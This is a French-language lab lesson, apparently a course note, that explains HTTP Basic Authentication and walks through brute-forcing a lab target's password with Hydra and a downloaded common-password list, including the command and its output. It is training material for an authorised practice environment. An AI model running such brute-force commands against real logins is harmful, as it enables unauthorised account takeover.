---
tags:
  - brute-force
ordre: 7
---

# Authentification HTTP de base

Les applications web emploient souvent des mécanismes d'authentification pour protéger les données et les fonctionnalités sensibles. L'authentification HTTP de base, ou simplement `Basic Auth`, est une méthode rudimentaire mais courante pour sécuriser les ressources sur le web. Bien que facile à mettre en œuvre, ses vulnérabilités de sécurité inhérentes en font une cible fréquente pour les attaques par force brute (brute-force attacks).

Essentiellement, la `Basic Auth` est un protocole de défi-réponse (challenge-response) où un serveur web exige les identifiants de l'utilisateur avant d'accorder l'accès aux ressources protégées. Le processus commence lorsqu'un utilisateur tente d'accéder à une zone restreinte. Le serveur répond avec un statut `401 Unauthorized` et un en-tête `WWW-Authenticate` invitant le navigateur de l'utilisateur à présenter une boîte de dialogue de connexion.

Une fois que l'utilisateur a fourni son nom d'utilisateur et son mot de passe, le navigateur les concatène en une seule chaîne, séparée par un deux-points. Cette chaîne est ensuite encodée en Base64 et incluse dans l'en-tête `Authorization` des requêtes suivantes, selon le format `Basic <encoded_credentials>`. Le serveur décode les identifiants, les vérifie par rapport à sa base de données, et accorde ou refuse l'accès en conséquence.

Par exemple, les en-têtes pour la `Basic Auth` dans une requête HTTP GET ressembleraient à ceci :

```http
GET /protected_resource HTTP/1.1 Host: www.example.com Authorization: Basic YWxpY2U6c2VjcmV0MTIz
```

## Exploiter la Basic Auth avec Hydra

**Pour suivre, démarrez le système cible via la section des questions en bas de la page.**

Nous utiliserons le service `http-get` de Hydra pour forcer par brute-force la cible d'authentification de base.

Dans ce scénario, l'instance cible lancée emploie l'authentification HTTP de base. Nous savons déjà que le nom d'utilisateur est `basic-auth-user`. Puisque nous connaissons le nom d'utilisateur, nous pouvons simplifier la commande Hydra et nous concentrer uniquement sur l'attaque par force brute du mot de passe. Voici la commande que nous utiliserons :

```bash
# Download wordlist if needed

Hiterof13@htb[/htb]$ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/56a39ab9a70a89b56d66dad8bdffb887fba1260e/Passwords/2023-200_most_used_passwords.txt # Hydra command

Hiterof13@htb[/htb]$ hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 127.0.0.1 http-get / -s 81  ... Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).  Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-09 16:04:31 [DATA] max 16 tasks per 1 server, overall 16 tasks, 200 login tries (l:1/p:200), ~13 tries per task [DATA] attacking http-get://127.0.0.1:81/ [81][http-get] host: 127.0.0.1   login: basic-auth-user   password: ... 1 of 1 target successfully completed, 1 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-09 16:04:32
```

Décomposons la commande :

- `-l basic-auth-user` : Spécifie que le nom d'utilisateur pour la tentative de connexion est 'basic-auth-user'.
- `-P 2023-200_most_used_passwords.txt` : Indique que Hydra doit utiliser la liste de mots de passe contenue dans le fichier '2023-200_most_used_passwords.txt' pour son attaque par force brute.
- `127.0.0.1` : C'est l'adresse IP cible, dans ce cas, la machine locale (localhost).
- `http-get /` : Indique à Hydra que le service cible est un serveur HTTP et que l'attaque doit être effectuée en utilisant des requêtes HTTP GET sur le chemin racine ('/').
- `-s 81` : Remplace le port par défaut pour le service HTTP et le définit sur 81.

Lors de l'exécution, Hydra essaiera systématiquement chaque mot de passe du fichier `2023-200_most_used_passwords.txt` contre la ressource spécifiée. Finalement, il retournera le mot de passe correct pour `basic-auth-user`, que vous pourrez utiliser pour vous connecter au site web et récupérer le flag.
---

← [[06 - Hydra]] | [[00 - Sommaire Login Brute Forcing|Sommaire]] | [[08 - Formulaires de connexion]] →
